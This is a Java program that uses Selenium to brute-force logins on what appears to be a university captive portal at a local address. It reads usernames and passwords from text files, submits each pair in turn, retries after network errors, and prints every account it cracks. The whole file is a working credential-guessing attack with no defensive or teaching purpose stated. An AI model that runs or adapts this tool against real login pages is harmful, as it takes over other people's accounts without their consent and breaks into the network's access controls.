package cli;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;

/* java 9.0.4
 * selenium: 3.11.0
 * geckodriver: 0.20.0
 * */
public class Execute {
	public static void main(String[] args) throws IOException, InterruptedException {
		System.setProperty("webdriver.gecko.driver",System.getProperty("user.dir")+"/GeckoDriver0.20.0/geckodriver-v0.20.0-win64/geckodriver.exe");		//for windows...
		WebDriver driver= new FirefoxDriver();
		BufferedReader br1=new BufferedReader(new FileReader(System.getProperty("user.dir")+"/data/username.txt"));
		BufferedReader br2;
		String pss;
		String usr;
		long time=5*1000;
		boolean pageLoad=false;
		//String portal="file://"+System.getProperty("user.dir")+"\\GEU\\normal\\Graphic%20Era%20Internet%20Portal.html";
		String portal="http://172.16.1.1:8090/httpclient.html";
		
	do{
		try{
		driver.get(portal);
		driver.manage().timeouts().pageLoadTimeout(10, TimeUnit.SECONDS );
		pageLoad=false;
		}
		catch(Exception x){
			pageLoad=true;
		}
	}while(pageLoad);


		System.out.println("Started...");
		while((usr=br1.readLine())!=null){
		pss=usr;		
			br2=new BufferedReader(new FileReader(System.getProperty("user.dir")+"/data/password.txt"));	
		try{	
			while(pss!=null){
		 driver.findElement(By.name("username")).sendKeys(usr);
		  driver.findElement(By.name("password")).sendKeys(pss); 
		  driver.findElement(By.id("logincaption")).submit();
		  Thread.sleep(200);
		 // WebDriverWait wait = new WebDriverWait(driver, 15);
		  //wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("logincaption")));
		 
		  if(driver.getPageSource().contains("The system could not log you on"))
		  {
		        driver.findElement(By.name("username")).clear();
		        driver.findElement(By.name("password")).clear(); 
		  } 
		  
		  else if(driver.getPageSource().contains("You have successfully logged in")){
			  System.out.println("Correct password for "+usr+": "+pss);
		      
			  driver.findElement(By.id("logincaption")).submit();
		      
			  driver.get(portal);
		  }
		  else if(driver.getPageSource().contains("You have reached Maximum Login Limit."))	
		  {
			  System.out.println("Correct password for "+usr+": "+pss);
		        
			  driver.findElement(By.id("logincaption")).submit();
		      
			  driver.get(portal);  
		  }
		  else if(driver.getPageSource().contains(" Your data transfer has been exceeded"))	
		  {
			  System.out.println("Correct password for "+usr+": "+pss);
		        
			  driver.findElement(By.id("logincaption")).submit();
		      
			  driver.get(portal);
		  }
		  
		  else{
		    	System.out.println("Network error.Waiting for "+time/1000+"seconds."); 
		    	System.out.println("error username="+usr+" passwrd="+pss);  	
		    	Thread.sleep(time);
		    	driver.get(portal);
		    	}
		  	pss=br2.readLine();
		  }//while pss
	 }catch(Exception e){
			System.out.println("Exception occured at="+usr+" Password="+pss+" Waiting for "+time/1000+"seconds.");	
			driver.close();
	         driver=new FirefoxDriver();
			 driver.get(portal);
			 Thread.sleep(time);	
	     }   // catch
		  	br2.close();
		}//while usr 
		br1.close();
		System.out.println("END");
	}

}
